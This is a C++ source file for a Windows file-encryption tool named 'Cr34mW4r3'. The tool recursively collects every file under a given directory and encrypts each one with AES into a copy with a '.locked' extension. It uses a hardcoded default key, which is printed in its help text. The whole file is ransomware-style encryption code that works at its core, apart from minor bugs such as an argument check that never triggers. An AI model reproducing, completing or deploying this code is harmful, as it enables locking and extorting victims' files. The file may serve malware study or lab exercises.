#include "encryptor.h"
#include <shlwapi.h>
#include <queue>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

BOOL FindFile(const std::wstring &directory, wstring ext, queue<wstring> &results, DWORD& errCode)
{
    // only local files - \\*
    std::wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    if (search_handle != INVALID_HANDLE_VALUE)
    {
        std::vector<std::wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            // FIX: oss << '\"' << fullBatchFileName << '\"';
            tmp = directory + L"\\" + std::wstring(file.cFileName);
            wcout << tmp << endl;
            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
              && PathMatchSpecW(file.cFileName, ext.c_str()))
                results.push(tmp);
           

            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                directories.push_back(tmp);
        } while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
            FindFile(*iter, ext, results, errCode);
        return TRUE;
    } else {
        errCode = GetLastError();
        return FALSE;
    }
}

const wstring sanitizePath(wstring path) {
     if('\\' == path[path.size() - 1]) {
         path.pop_back();
     }
     return path;
}

int wmain(int argc, wchar_t** argv)
{
    auto printNice = [](const wchar_t* s) {
        wcout << "[*] " << s << endl;
    };

    const wchar_t* help =
        L"[*] This is  the Cr34mW4r3 manpage\n"
        L"[+] usage: creamware <dirpath> <b64(aeskey-16)>\n"
        L"[+] if aeskey-16 is not specified the following key will be used:\n"
        L"[*] aeskey: 3igcZhRdWq96m3GUmTAiv9\n";


    if (argc < 1) {
        wcout << help;
        return 0;
    }

    wcout << argv[1] << endl;
    const wstring directoryPath = sanitizePath(argv[1]);
    wcout << "now " << directoryPath << endl;
    wcout << "dir path: " << directoryPath << endl;
    queue<wstring> results;

    DWORD errCode = 0;
    if (FindFile(directoryPath, L"", results, errCode) != TRUE) {
        printNice(L"Some problem with the path provided ...");
        return 1;
    }

    wstring(fileName);
    wstring(newFileName);

    auto aeskey = (argc == 3 ? argv[2] : L"3igcZhRdWq96m3GUmTAiv9");
    while (results.size()) {
        fileName = results.front();
        newFileName = (fileName + L".locked");

        wcout << "[*] Encrypting " << fileName;
        wcout << "to " << newFileName << endl;
        encryptFile(
            fileName.c_str(), newFileName.c_str(),
            aeskey, false
        );

        wcout << fileName << endl;
        results.pop();
    }
    return 0;
}
